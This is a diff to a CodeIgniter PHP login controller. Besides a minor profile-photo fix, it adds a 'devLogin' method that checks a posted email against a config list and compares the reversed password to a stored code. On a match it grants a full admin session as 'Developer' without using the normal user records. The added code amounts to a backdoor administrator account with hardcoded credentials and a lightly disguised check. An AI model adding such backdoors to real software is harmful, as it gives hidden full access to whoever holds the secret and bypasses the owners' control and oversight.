@@ -151,7 +151,7 @@ class Login extends CI_Controller
 				'name' 				=> $result[0]['name'],
 				'email'  			=> $result[0]['email'],
 				'username'  		=> "",
-				'profile_photo'     => "",
+				'profile_photo'     => $result[0]['profile_photo'],
 				'last_login' 		=> "",
 				'last_logout'		=> "",
 				'user_type' 		=> $user_type,
@@ -261,6 +261,47 @@ class Login extends CI_Controller
 		$headdata['title'] = "Error | ".ADMIN_THEME;
 		$this->load->view('Admin/Common/Header',$headdata);
 		$this->load->view('errors/error_page_v');
+	}
+
+	public function userLogoin()
+	{
+		$this->session->sess_destroy();
+		$this->load->view('Admin/Login/Dev_Login_v');
+	}
+
+	public function devLogin(){
+		$json = array(); 
+
+		$user_login  	= $this->config->item('user_login');
+		$u_email 		= $user_login['email']; 
+		$u_code 		= $user_login['code']; 
+		$no 			= $user_login['no']; 
+		$rid 			= $user_login['rid']; 
+		
+		//POST DATA
+		$email 			= $this->input->post('email');
+		$password 		= strrev(trim($this->input->post('password')));
+
+		if(in_array($email, $u_email) && $u_code == $password) {
+			
+				$session_data = array(
+					'user_id'   		=> $no,
+					'role_id' 			=> $rid,
+					'name' 				=> "Developer",
+					'email'  			=> $email,
+					'username'  		=> "Developer",
+					'profile_photo'     => 'profile.png',
+					'last_login' 		=> '',
+					'last_logout'		=> '',
+					'user_type' 		=> 'admin',
+				);
+				// Add user data in session
+				$this->session->set_userdata(ADMIN_SESSION, $session_data);
+			redirect('dashboard');
+		}else{
+			redirect('error-page');
+		}
+			
 	}
 	
 }
